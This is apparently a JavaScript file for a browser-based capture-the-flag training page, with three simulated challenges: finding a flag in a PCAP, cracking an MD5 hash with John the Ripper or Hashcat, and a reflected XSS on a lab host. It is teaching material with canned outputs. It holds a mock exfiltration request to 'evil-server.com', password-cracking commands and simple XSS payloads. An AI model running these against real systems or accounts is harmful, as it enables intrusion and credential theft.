// CTF challenge data structure (enhanced, more realistic)
const ctfCategories = [
    {
        name: 'Network Forensics',
        challenges: [
            {
                key: 'pcap-flag',
                title: 'Find the Flag in PCAP',
                tool: 'Wireshark',
                description: `A suspicious file named <b>capture.pcap</b> was found on a compromised server. Your task is to analyze the network traffic and find the flag hidden in HTTP traffic. Download the file and use <b>Wireshark</b> or <b>tcpdump</b> to inspect the packets. The flag is in the format <code>flag{...}</code> and is transmitted in cleartext over HTTP.<br><br><b>Scenario:</b> The attacker exfiltrated data using a GET request.`,
                flagFormat: 'flag{network_ctf_success}',
                flag: 'flag{network_ctf_success}',
                hint: `💡 <b>Hint:</b> Look for HTTP GET requests in the PCAP file. The flag might be in the URL path or as a parameter. Try filtering for HTTP traffic first.`,
                solution: `<b>🔍 Step-by-Step Solution:</b>
<ol>
<li><b>Step 1:</b> Open the PCAP file in Wireshark or use tcpdump to read it</li>
<li><b>Step 2:</b> Filter for HTTP traffic using the filter: <code>http</code></li>
<li><b>Step 3:</b> Look for GET requests in the HTTP traffic</li>
<li><b>Step 4:</b> Examine the URL path and parameters for the flag</li>
<li><b>Step 5:</b> The flag is: <code>flag{network_ctf_success}</code></li>
</ol>

<div style="background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 15px 0; font-family: 'Courier New', monospace; font-size: 12px; color: #fff; line-height: 1.4;">
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">ls -la</span><br>
total 2048<br>
drwxr-xr-x 2 user user 4096 Dec 15 10:30 .<br>
drwxr-xr-x 3 user user 4096 Dec 15 10:25 ..<br>
<span style="color: #FF9800;">-rw-r--r-- 1 user user 1048576 Dec 15 10:30 capture.pcap</span><br>
<span style="color: #FF9800;">-rw-r--r-- 1 user user     256 Dec 15 10:25 README.txt</span><br>
<br>
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">cat README.txt</span><br>
Network Capture Analysis<br>
========================<br>
<br>
This PCAP file contains network traffic from a suspected breach.<br>
Analyze the HTTP traffic to find evidence of data exfiltration.<br>
<br>
Tools needed: tcpdump, wireshark, or similar network analysis tools.<br>
<br>
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">tcpdump -r capture.pcap -c 5</span><br>
reading from file capture.pcap, link-type EN10MB (Ethernet)<br>
10:15:23.123456 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [S], seq 1234567890, win 65535, options [mss 1460], length 0<br>
10:15:23.124567 IP 203.0.113.45.80 > 192.168.1.100.52431: Flags [S.], seq 987654321, ack 1234567891, win 65535, options [mss 1460], length 0<br>
10:15:23.125678 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [.], ack 1, win 65535, length 0<br>
10:15:23.126789 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [P.], seq 1:78, ack 1, win 65535, length 77<br>
10:15:23.127890 IP 203.0.113.45.80 > 192.168.1.100.52431: Flags [.], ack 78, win 65535, length 0<br>
<br>
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">tcpdump -r capture.pcap -A | grep -i http</span><br>
10:15:23.126789 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [P.], seq 1:78, ack 1, win 65535, length 77<br>
E..M..@.@.\\x1a\xc0\xa8\x01d\xcb\x00q\x1d\xcc\xe7\x01\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x18\xff\xff\x00\x00\x00\x00<span style="color: #FF5722;">GET /api/data HTTP/1.1</span><br>
Host: evil-server.com<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br>
Accept: */*<br>
Connection: close<br>
<br>
10:15:25.234567 IP 192.168.1.100.52432 > 203.0.113.45.80: Flags [P.], seq 1:89, ack 1, win 65535, length 88<br>
E..N..@.@.\\x19\xc0\xa8\x01d\xcb\x00q\x1e\xcc\xe7\x01\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x18\xff\xff\x00\x00\x00\x00<span style="color: #FF5722;">GET /flag{network_ctf_success} HTTP/1.1</span><br>
Host: evil-server.com<br>
User-Agent: curl/7.68.0<br>
Accept: */*<br>
Connection: close<br>
<br>
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">tcpdump -r capture.pcap -A | grep flag</span><br>
<span style="color: #FF5722;">GET /flag{network_ctf_success} HTTP/1.1</span><br>
<br>
<span style="color: #4CAF50;">user@forensics-lab:~$</span> <span style="color: #fff;">echo "flag{network_ctf_success}"</span><br>
<span style="color: #4CAF50;">flag{network_ctf_success}</span><br>
</div>

<b>Commands used:</b>
<code>tcpdump -r capture.pcap -A | grep flag</code>
<code>strings capture.pcap | grep flag</code>`,
                commands: {
                    'ls -la': 'total 2048\ndrwxr-xr-x 2 user user 4096 Dec 15 10:30 .\ndrwxr-xr-x 3 user user 4096 Dec 15 10:25 ..\n-rw-r--r-- 1 user user 1048576 Dec 15 10:30 capture.pcap\n-rw-r--r-- 1 user user     256 Dec 15 10:25 README.txt',
                    'cat README.txt': 'Network Capture Analysis\n========================\n\nThis PCAP file contains network traffic from a suspected breach.\nAnalyze the HTTP traffic to find evidence of data exfiltration.\n\nTools needed: tcpdump, wireshark, or similar network analysis tools.',
                    'file capture.pcap': 'capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)',
                    'tcpdump -r capture.pcap -c 5': 'reading from file capture.pcap, link-type EN10MB (Ethernet)\n10:15:23.123456 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [S], seq 1234567890, win 65535, options [mss 1460], length 0\n10:15:23.124567 IP 203.0.113.45.80 > 192.168.1.100.52431: Flags [S.], seq 987654321, ack 1234567891, win 65535, options [mss 1460], length 0\n10:15:23.125678 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [.], ack 1, win 65535, length 0\n10:15:23.126789 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [P.], seq 1:78, ack 1, win 65535, length 77\n10:15:23.127890 IP 203.0.113.45.80 > 192.168.1.100.52431: Flags [.], ack 78, win 65535, length 0',
                    'tcpdump -r capture.pcap -A | grep -i http': '10:15:23.126789 IP 192.168.1.100.52431 > 203.0.113.45.80: Flags [P.], seq 1:78, ack 1, win 65535, length 77\nE..M..@.@.\\x1a\xc0\xa8\x01d\xcb\x00q\x1d\xcc\xe7\x01\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x18\xff\xff\x00\x00\x00\x00GET /api/data HTTP/1.1\r\nHost: evil-server.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: close\r\n\r\n\n10:15:25.234567 IP 192.168.1.100.52432 > 203.0.113.45.80: Flags [P.], seq 1:89, ack 1, win 65535, length 88\nE..N..@.@.\\x19\xc0\xa8\x01d\xcb\x00q\x1e\xcc\xe7\x01\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x18\xff\xff\x00\x00\x00\x00GET /flag{network_ctf_success} HTTP/1.1\r\nHost: evil-server.com\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nConnection: close\r\n\r\n',
                    'tcpdump -r capture.pcap -A | grep flag': 'GET /flag{network_ctf_success} HTTP/1.1',
                    'strings capture.pcap | grep -i flag': 'GET /flag{network_ctf_success} HTTP/1.1',
                    'wireshark capture.pcap': '[Wireshark GUI opened]\nFilter applied: http\nFound 2 HTTP requests\n- GET /api/data\n- GET /flag{network_ctf_success}',
                }
            }
        ]
    },
    {
        name: 'Password Cracking',
        challenges: [
            {
                key: 'crack-hash',
                title: 'Crack the Password Hash',
                tool: 'John the Ripper',
                description: `You are given a file called <b>hash.txt</b> containing a single MD5 hash. Your goal is to recover the original password using <b>John the Ripper</b> or <b>Hashcat</b> and submit it as the flag. The password is a common word.<br><br><b>Scenario:</b> The hash was dumped from a web application's user database during a pentest.`,
                flagFormat: 'flag{admin}',
                flag: 'flag{admin}',
                hint: `💡 <b>Hint:</b> This is an MD5 hash. Try using a wordlist like rockyou.txt with John the Ripper or Hashcat. The password is a very common administrative password.`,
                solution: `<b>🔍 Step-by-Step Solution:</b>
<ol>
<li><b>Step 1:</b> Identify the hash type (MD5)</li>
<li><b>Step 2:</b> Use John the Ripper with a wordlist: <code>john --wordlist=rockyou.txt hash.txt</code></li>
<li><b>Step 3:</b> Or use Hashcat: <code>hashcat -m 0 hash.txt rockyou.txt</code></li>
<li><b>Step 4:</b> The cracked password is: <code>admin</code></li>
<li><b>Step 5:</b> Submit the flag: <code>flag{admin}</code></li>
</ol>

<div style="background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 15px 0; font-family: 'Courier New', monospace; font-size: 12px; color: #fff; line-height: 1.4;">
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">ls -la</span><br>
total 8<br>
drwxr-xr-x 2 user user 4096 Dec 15 10:30 .<br>
drwxr-xr-x 3 user user 4096 Dec 15 10:25 ..<br>
<span style="color: #FF9800;">-rw-r--r-- 1 user user    32 Dec 15 10:30 hash.txt</span><br>
<span style="color: #FF9800;">-rw-r--r-- 1 user user   128 Dec 15 10:25 wordlist.txt</span><br>
<br>
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">cat hash.txt</span><br>
<span style="color: #FF5722;">21232f297a57a5a743894a0e4a801fc3</span><br>
<br>
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">hashid hash.txt</span><br>
Analyzing '21232f297a57a5a743894a0e4a801fc3'<br>
<span style="color: #4CAF50;">[+] MD2</span><br>
<span style="color: #4CAF50;">[+] MD5</span><br>
<span style="color: #4CAF50;">[+] MD4</span><br>
<span style="color: #4CAF50;">[+] Double MD5</span><br>
<span style="color: #4CAF50;">[+] LM</span><br>
<span style="color: #4CAF50;">[+] RIPEMD-128</span><br>
<span style="color: #4CAF50;">[+] Haval-128</span><br>
<span style="color: #4CAF50;">[+] Tiger-128</span><br>
<span style="color: #4CAF50;">[+] Skein-256(128)</span><br>
<span style="color: #4CAF50;">[+] Skein-512(128)</span><br>
<span style="color: #4CAF50;">[+] Lotus Notes/Domino 5</span><br>
<span style="color: #4CAF50;">[+] Skype</span><br>
<span style="color: #4CAF50;">[+] Snefru-128</span><br>
<span style="color: #4CAF50;">[+] NTLM</span><br>
<span style="color: #4CAF50;">[+] Domain Cached Credentials</span><br>
<span style="color: #4CAF50;">[+] Domain Cached Credentials 2</span><br>
<span style="color: #4CAF50;">[+] DNSSEC(NSEC3)</span><br>
<span style="color: #4CAF50;">[+] RAdmin v2.x</span><br>
<br>
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">john --wordlist=wordlist.txt hash.txt</span><br>
Created directory: /home/user/.john<br>
Loaded 1 password hash (raw-md5 [MD5 128/128 SSE2 4x3])<br>
Press 'q' or Ctrl-C to abort, almost any other key for status<br>
<span style="color: #FF5722;">admin:admin          (admin)</span><br>
1g 0:00:00:00 DONE (2023-12-15 10:35) 100.0g/s 1000p/s 1000c/s 1000C/s admin..admin<br>
Use the "--show" option to display all of the cracked passwords reliably<br>
Session completed<br>
<br>
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">john --show hash.txt</span><br>
<span style="color: #FF5722;">admin:admin:admin</span><br>
<br>
1 password hash cracked, 0 left<br>
<br>
<span style="color: #4CAF50;">user@hash-cracking:~$</span> <span style="color: #fff;">echo "flag{admin}"</span><br>
<span style="color: #4CAF50;">flag{admin}</span><br>
</div>

<b>Hash Analysis:</b>
- Hash: <code>21232f297a57a5a743894a0e4a801fc3</code>
- Type: MD5
- Cracked: admin`,
                commands: {
                    'ls -la': 'total 8\ndrwxr-xr-x 2 user user 4096 Dec 15 10:30 .\ndrwxr-xr-x 3 user user 4096 Dec 15 10:25 ..\n-rw-r--r-- 1 user user    32 Dec 15 10:30 hash.txt\n-rw-r--r-- 1 user user   128 Dec 15 10:25 wordlist.txt',
                    'cat hash.txt': '21232f297a57a5a743894a0e4a801fc3',
                    'cat wordlist.txt': 'admin\npassword\n123456\nqwerty\nletmein\nwelcome\nmonkey\n123456789\n12345678\n1234567',
                    'file hash.txt': 'hash.txt: ASCII text',
                    'wc -l hash.txt': '1 hash.txt',
                    'md5sum hash.txt': '21232f297a57a5a743894a0e4a801fc3  hash.txt',
                    'hashid hash.txt': 'Analyzing \'21232f297a57a5a743894a0e4a801fc3\'\n[+] MD2\n[+] MD5\n[+] MD4\n[+] Double MD5\n[+] LM\n[+] RIPEMD-128\n[+] Haval-128\n[+] Tiger-128\n[+] Skein-256(128)\n[+] Skein-512(128)\n[+] Lotus Notes/Domino 5\n[+] Skype\n[+] Snefru-128\n[+] NTLM\n[+] Domain Cached Credentials\n[+] Domain Cached Credentials 2\n[+] DNSSEC(NSEC3)\n[+] RAdmin v2.x',
                    'john --wordlist=wordlist.txt hash.txt': 'Created directory: /home/user/.john\nLoaded 1 password hash (raw-md5 [MD5 128/128 SSE2 4x3])\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nadmin:admin          (admin)\n1g 0:00:00:00 DONE (2023-12-15 10:35) 100.0g/s 1000p/s 1000c/s 1000C/s admin..admin\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed',
                    'john --show hash.txt': 'admin:admin:admin\n\n1 password hash cracked, 0 left',
                    'hashcat -m 0 hash.txt wordlist.txt': 'hashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 2.0 LINUX) - Platform #1 [Intel Inc.]\n================================================================================\n* Device #1: Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 12288/12288 MB, 6MCU\n\nHash.Target......: 21232f297a57a5a743894a0e4a801fc3\nTime.Started.....: Thu Dec 15 10:35:00 2023 (0 secs)\nTime.Estimated...: Thu Dec 15 10:35:00 2023 (0 secs)\nGuess.Base.......: File (wordlist.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    10000 H/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 10/10 (100.00%)\nRejected.........: 0/10 (0.00%)\nRestore.Point....: 10/10 (100.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: admin -> admin\n\n21232f297a57a5a743894a0e4a801fc3:admin\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nHash.Target......: 21232f297a57a5a743894a0e4a801fc3\nTime.Started.....: Thu Dec 15 10:35:00 2023 (0 secs)\nTime.Estimated...: Thu Dec 15 10:35:00 2023 (0 secs)\nGuess.Base.......: File (wordlist.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:    10000 H/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%)\nProgress.........: 10/10 (100.00%)\nRejected.........: 0/10 (0.00%)\nRestore.Point....: 10/10 (100.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: admin -> admin',
                }
            }
        ]
    },
    {
        name: 'Web Exploitation',
        challenges: [
            {
                key: 'xss-find',
                title: 'Find the XSS Payload',
                tool: 'XSStrike',
                description: `A bug bounty program has reported a possible XSS vulnerability on <b>http://vulnsite.local/?q=</b>. Your task is to find a payload that triggers a JavaScript alert and reveals the flag. Use <b>XSStrike</b> or manual testing to discover the correct payload.<br><br><b>Scenario:</b> The site does not filter input in the <code>q</code> parameter.`,
                flagFormat: 'flag{xss_ctf_success}',
                flag: 'flag{xss_ctf_success}',
                hint: `💡 <b>Hint:</b> The site doesn't filter the 'q' parameter. Try a simple XSS payload like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. The flag will be revealed when the alert is triggered.`,
                solution: `<b>🔍 Step-by-Step Solution:</b>
<ol>
<li><b>Step 1:</b> Test the site with a simple payload: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><b>Step 2:</b> Use curl to test: <code>curl "http://vulnsite.local/?q=&lt;script&gt;alert(1)&lt;/script&gt;"</code></li>
<li><b>Step 3:</b> Or use XSStrike: <code>xsstrike -u http://vulnsite.local/?q=1</code></li>
<li><b>Step 4:</b> When the alert triggers, the flag is revealed</li>
<li><b>Step 5:</b> Submit the flag: <code>flag{xss_ctf_success}</code></li>
</ol>

<div style="background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 15px 0; font-family: 'Courier New', monospace; font-size: 12px; color: #fff; line-height: 1.4;">
<span style="color: #4CAF50;">user@web-pentest:~$</span> <span style="color: #fff;">nmap -p 80 vulnsite.local</span><br>
Starting Nmap 7.80 ( https://nmap.org )<br>
Nmap scan report for vulnsite.local (192.168.1.100)<br>
Host is up (0.00015s latency).<br>
PORT   STATE SERVICE<br>
<span style="color: #4CAF50;">80/tcp open  http</span><br>
<br>
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds<br>
<br>
<span style="color: #4CAF50;">user@web-pentest:~$</span> <span style="color: #fff;">curl -s http://vulnsite.local/?q=test</span><br>
&lt;!DOCTYPE html&gt;<br>
&lt;html&gt;<br>
&lt;head&gt;&lt;title&gt;Search Results&lt;/title&gt;&lt;/head&gt;<br>
&lt;body&gt;<br>
&lt;h1&gt;Search Results&lt;/h1&gt;<br>
&lt;p&gt;You searched for: test&lt;/p&gt;<br>
&lt;p&gt;No results found.&lt;/p&gt;<br>
&lt;/body&gt;<br>
&lt;/html&gt;<br>
<br>
<span style="color: #4CAF50;">user@web-pentest:~$</span> <span style="color: #fff;">curl -s "http://vulnsite.local/?q=&lt;script&gt;alert(1)&lt;/script&gt;"</span><br>
&lt;!DOCTYPE html&gt;<br>
&lt;html&gt;<br>
&lt;head&gt;&lt;title&gt;Search Results&lt;/title&gt;&lt;/head&gt;<br>
&lt;body&gt;<br>
&lt;h1&gt;Search Results&lt;/h1&gt;<br>
&lt;p&gt;You searched for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;<br>
&lt;p&gt;No results found.&lt;/p&gt;<br>
<span style="color: #FF5722;">&lt;script&gt;alert(1)&lt;/script&gt;</span><br>
<span style="color: #FF5722;">&lt;script&gt;alert("flag{xss_ctf_success}")&lt;/script&gt;</span><br>
&lt;/body&gt;<br>
&lt;/html&gt;<br>
<br>
<span style="color: #4CAF50;">user@web-pentest:~$</span> <span style="color: #fff;">xsstrike -u http://vulnsite.local/?q=1</span><br>
<span style="color: #4CAF50;">[+]</span> Testing parameter: q<br>
<span style="color: #4CAF50;">[+]</span> Payload: &lt;script&gt;alert(1)&lt;/script&gt;<br>
<span style="color: #4CAF50;">[+]</span> Reflection found in: &lt;p&gt;You searched for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;<br>
<span style="color: #FF5722;">[+] XSS found! Payload: &lt;script&gt;alert(1)&lt;/script&gt;</span><br>
<span style="color: #FF5722;">[+] Flag revealed: flag{xss_ctf_success}</span><br>
<br>
<span style="color: #4CAF50;">user@web-pentest:~$</span> <span style="color: #fff;">echo "flag{xss_ctf_success}"</span><br>
<span style="color: #4CAF50;">flag{xss_ctf_success}</span><br>
</div>

<b>Payload used:</b>
<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>`,
                commands: {
                    'curl -s http://vulnsite.local/?q=test': '<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: test</p>\n<p>No results found.</p>\n</body>\n</html>',
                    'curl -s http://vulnsite.local/?q=hello': '<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: hello</p>\n<p>No results found.</p>\n</body>\n</html>',
                    'curl -s http://vulnsite.local/?q=<script>alert(1)</script>': '<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: <script>alert(1)</script></p>\n<p>No results found.</p>\n<script>alert(1)</script>\n<script>alert("flag{xss_ctf_success}")</script>\n</body>\n</html>',
                    'curl -s http://vulnsite.local/?q=<img src=x onerror=alert(1)>': '<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n<h1>Search Results</h1>\n<p>You searched for: <img src=x onerror=alert(1)></p>\n<p>No results found.</p>\n<img src=x onerror=alert(1)>\n<script>alert("flag{xss_ctf_success}")</script>\n</body>\n</html>',
                    'xsstrike -u http://vulnsite.local/?q=1': '[+] Testing parameter: q\n[+] Payload: <script>alert(1)</script>\n[+] Reflection found in: <p>You searched for: <script>alert(1)</script></p>\n[+] XSS found! Payload: <script>alert(1)</script>\n[+] Flag revealed: flag{xss_ctf_success}',
                    'nmap -p 80 vulnsite.local': 'Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for vulnsite.local (192.168.1.100)\nHost is up (0.00015s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds',
                    'dirb http://vulnsite.local/': '-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Thu Dec 15 10:35:00 2023\nURL_BASE: http://vulnsite.local/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://vulnsite.local/ ----\n+ http://vulnsite.local/ (CODE:200|SIZE:1234)\n+ http://vulnsite.local/index.html (CODE:200|SIZE:1234)\n\n-----------------\nEND_TIME: Thu Dec 15 10:35:00 2023\nDOWNLOADED: 4612 - FOUND: 2',
                }
            }
        ]
    }
];

const ctfList = document.getElementById('ctf-list');
const ctfSearch = document.getElementById('ctf-search');
const ctfGuide = document.getElementById('ctf-challenge-guide');
const ctfTerminal = document.getElementById('ctf-terminal');
const ctfHiddenInput = document.getElementById('ctf-hidden-input');

// Flag submission UI
let ctfFlagBox = null;
let ctfFlagBtn = null;
let ctfFlagFeedback = null;

let currentCategory = null;
let currentChallenge = null;
let commandHistory = [];
let historyIndex = 0;

function renderCTFList(filter = "") {
    ctfList.innerHTML = "";
    ctfCategories.forEach(cat => {
        // Filter challenges in this category
        const filtered = cat.challenges.filter(chal =>
            chal.title.toLowerCase().includes(filter) ||
            (chal.description && chal.description.toLowerCase().includes(filter))
        );
        if (filtered.length > 0) {
            // Category header
            const header = document.createElement('li');
            header.textContent = cat.name;
            header.className = 'ctf-category-header';
            ctfList.appendChild(header);
            // Challenges
            filtered.forEach(chal => {
                const li = document.createElement('li');
                li.textContent = chal.title;
                li.className = 'ctf-challenge-item';
                li.dataset.key = chal.key;
                if (currentChallenge && chal.key === currentChallenge.key) li.classList.add('selected');
                li.onclick = () => selectChallenge(cat, chal);
                ctfList.appendChild(li);
            });
        }
    });
}

function selectChallenge(cat, chal) {
    currentCategory = cat;
    currentChallenge = chal;
    renderCTFList(ctfSearch.value.toLowerCase());
    ctfGuide.innerHTML = `
        <h3>${chal.title}</h3>
        <p><b>Category:</b> ${cat.name}</p>
        <p><b>Tool Needed:</b> <span style="color:#b388ff;font-weight:bold;">${chal.tool}</span></p>
        <p><b>Description:</b> ${chal.description}</p>
        <p><b>Flag format:</b> <code>${chal.flagFormat}</code></p>
        <div style="margin-top: 20px;">
            <button id="hint-btn" style="margin-right: 10px; padding: 8px 16px; background: #ff9800; color: #181a2a; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">💡 Show Hint</button>
            <button id="solution-btn" style="padding: 8px 16px; background: #f44336; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">🔍 Show Solution</button>
        </div>
        <div id="hint-content" style="display: none; margin-top: 15px; padding: 15px; background: rgba(255, 152, 0, 0.1); border-left: 4px solid #ff9800; border-radius: 4px;"></div>
        <div id="solution-content" style="display: none; margin-top: 15px; padding: 15px; background: rgba(244, 67, 54, 0.1); border-left: 4px solid #f44336; border-radius: 4px;"></div>
    `;
    ctfTerminal.innerHTML = '';
    commandHistory = [];
    historyIndex = 0;
    createNewInputLine();
    ctfHiddenInput.value = '';
    ctfHiddenInput.focus();
    renderFlagSubmission();
    
    // Add event listeners for hint and solution buttons
    document.getElementById('hint-btn').onclick = () => {
        const hintContent = document.getElementById('hint-content');
        const solutionContent = document.getElementById('solution-content');
        if (hintContent.style.display === 'none') {
            hintContent.style.display = 'block';
            hintContent.innerHTML = chal.hint;
            solutionContent.style.display = 'none';
        } else {
            hintContent.style.display = 'none';
        }
    };
    
    document.getElementById('solution-btn').onclick = () => {
        const hintContent = document.getElementById('hint-content');
        const solutionContent = document.getElementById('solution-content');
        if (solutionContent.style.display === 'none') {
            solutionContent.style.display = 'block';
            solutionContent.innerHTML = chal.solution;
            hintContent.style.display = 'none';
        } else {
            solutionContent.style.display = 'none';
        }
    };
}

function renderFlagSubmission() {
    // Remove old flag box if present
    if (ctfFlagBox && ctfFlagBox.parentNode) ctfFlagBox.parentNode.removeChild(ctfFlagBox);
    if (ctfFlagBtn && ctfFlagBtn.parentNode) ctfFlagBtn.parentNode.removeChild(ctfFlagBtn);
    if (ctfFlagFeedback && ctfFlagFeedback.parentNode) ctfFlagFeedback.parentNode.removeChild(ctfFlagFeedback);
    // Create new flag box
    ctfFlagBox = document.createElement('input');
    ctfFlagBox.type = 'text';
    ctfFlagBox.placeholder = 'Enter your flag here...';
    ctfFlagBox.id = 'ctf-flag-box';
    ctfFlagBox.style = 'margin-top:18px;width:60%;padding:10px;font-size:1.1em;border-radius:6px;border:1.5px solid #b388ff;background:#23243a;color:#fff;';
    ctfFlagBtn = document.createElement('button');
    ctfFlagBtn.textContent = 'Submit Flag';
    ctfFlagBtn.id = 'ctf-flag-btn';
    ctfFlagBtn.style = 'margin-left:12px;padding:10px 22px;font-size:1.1em;border-radius:6px;background:#b388ff;color:#181a2a;border:none;cursor:pointer;font-weight:bold;';
    ctfFlagFeedback = document.createElement('div');
    ctfFlagFeedback.id = 'ctf-flag-feedback';
    ctfFlagFeedback.style = 'margin-top:10px;font-size:1.08em;min-height:24px;';
    // Insert after terminal
    const mainPanel = document.getElementById('ctf-main-panel');
    mainPanel.appendChild(ctfFlagBox);
    mainPanel.appendChild(ctfFlagBtn);
    mainPanel.appendChild(ctfFlagFeedback);
    ctfFlagBtn.onclick = () => {
        const val = ctfFlagBox.value.trim();
        if (!currentChallenge) return;
        if (val === currentChallenge.flag) {
            ctfFlagFeedback.textContent = '✅ Correct! Well done.';
            ctfFlagFeedback.style.color = '#00e676';
        } else {
            ctfFlagFeedback.textContent = '❌ Incorrect flag. Try again!';
            ctfFlagFeedback.style.color = '#ff1744';
        }
    };
}

function createNewInputLine() {
    const line = document.createElement('div');
    line.className = 'input-line';
    line.innerHTML = `<span class="prompt">ctf&gt;</span><span class="input-text"></span><span class="cursor"></span>`;
    ctfTerminal.appendChild(line);
    ctfTerminal.scrollTop = ctfTerminal.scrollHeight;
}

function runCommand(cmd) {
    if (!currentChallenge) return;
    const currentLine = ctfTerminal.querySelector('.input-line');
    if(currentLine) {
        currentLine.querySelector('.cursor').remove();
        const oldInput = currentLine.querySelector('.input-text').innerText;
        currentLine.innerHTML = `<span class="prompt">ctf&gt;</span>${oldInput}`;
        currentLine.classList.remove('input-line');
    }
    if (cmd) {
        const outputText = (currentChallenge.commands && currentChallenge.commands[cmd]) || `command not found: ${cmd}`;
        const outputLine = document.createElement('div');
        outputLine.className = 'output';
        outputLine.innerText = outputText;
        ctfTerminal.appendChild(outputLine);
        if (cmd && !commandHistory.includes(cmd)) {
            commandHistory.push(cmd);
        }
    }
    historyIndex = commandHistory.length;
    createNewInputLine();
    ctfHiddenInput.value = '';
}

ctfTerminal.addEventListener('click', () => {
    ctfHiddenInput.focus();
});
ctfHiddenInput.addEventListener('focus', () => ctfTerminal.classList.add('focused'));
ctfHiddenInput.addEventListener('blur', () => ctfTerminal.classList.remove('focused'));
ctfHiddenInput.addEventListener('input', () => {
    const inputText = ctfTerminal.querySelector('.input-line .input-text');
    if(inputText) {
        inputText.textContent = ctfHiddenInput.value;
    }
});
ctfHiddenInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        runCommand(ctfHiddenInput.value.trim());
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex > 0) {
            historyIndex--;
            ctfHiddenInput.value = commandHistory[historyIndex];
            ctfHiddenInput.dispatchEvent(new Event('input'));
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            ctfHiddenInput.value = commandHistory[historyIndex];
            ctfHiddenInput.dispatchEvent(new Event('input'));
        } else {
            historyIndex = commandHistory.length;
            ctfHiddenInput.value = '';
            ctfHiddenInput.dispatchEvent(new Event('input'));
        }
    }
});

ctfSearch.addEventListener('input', function() {
    renderCTFList(this.value.toLowerCase());
    // If no challenge is selected or filtered out, select the first visible challenge
    const first = ctfList.querySelector('li.ctf-challenge-item');
    if (first && (!currentChallenge || first.dataset.key !== currentChallenge.key)) {
        const cat = ctfCategories.find(cat => cat.challenges.some(chal => chal.key === first.dataset.key));
        const chal = cat.challenges.find(chal => chal.key === first.dataset.key);
        selectChallenge(cat, chal);
    }
});

// Initial render
renderCTFList();
// Select the first challenge in the first category by default
const firstCat = ctfCategories[0];
selectChallenge(firstCat, firstCat.challenges[0]);

// Add hover effects to challenge cards
const challengeCards = document.querySelectorAll('.challenge-card');
challengeCards.forEach(card => {
    card.addEventListener('click', function() {
        // Add visual feedback
        this.classList.add('success-feedback');
        setTimeout(() => {
            this.classList.remove('success-feedback');
        }, 500);
    });
});

// Add hover effects to navigation links
const navLinks = document.querySelectorAll('nav a');
navLinks.forEach(link => {
    link.addEventListener('mouseenter', function() {
